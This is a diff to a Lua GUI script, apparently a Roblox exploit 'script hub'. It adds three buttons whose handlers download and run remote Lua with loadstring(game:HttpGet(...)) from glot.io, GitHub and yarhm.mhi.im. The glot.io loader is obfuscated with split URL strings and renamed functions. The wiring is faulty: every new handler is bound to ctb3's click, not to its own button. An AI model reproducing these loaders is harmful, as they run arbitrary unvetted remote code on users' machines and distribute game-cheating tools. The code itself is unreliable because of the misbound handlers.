@@ -1591,6 +1591,32 @@ ctb3.MouseButton1Click:Connect(function()
     end)
 end)
 
+-- CTB4
+local ctb4 = createImageButton("Rochips", 50, 50, 50, 0.2, "111409127543607", false)
+ctb3.MouseButton1Click:Connect(function()
+    pcall(function()
+
+        if "you wanna use rochips universal" then 	local z_x,z_z="gzrux646yj/raw/main.ts","https://glot.io/snippets/" 	local im,lonely,z_c=task.wait,game,loadstring 	z_c(lonely:HttpGet(z_z..""..z_x))() 	return ("This will load in about 2 - 30 seconds" or "according to your device and executor") end  
+    end)
+end)
+
+-- CTB5
+local ctb5 = createImageButton("Ketamine", 50, 50, 50, 0.2, "73739594473443", false)
+ctb3.MouseButton1Click:Connect(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/InfernusScripts/Ketamine/refs/heads/main/Ketamine.lua"))()
+    end)
+end)
+
+-- CTB5
+local ctb6 = createImageButton("AFEM", 50, 50, 50, 0.2, "70633192931522", false)
+ctb3.MouseButton1Click:Connect(function()
+    pcall(function()
+
+        loadstring(game:HttpGet("https://yarhm.mhi.im/scr?channel=afem", false))()
+    end)
+end)
+
 -- ===== TEXT BUTTONS =======
 -- helper: TextButton creation (parented to tb by default)
 local function createTextButton(name, r, g, b, bt, text, scaled, visible, tr, tg, tb2, parentFrame)
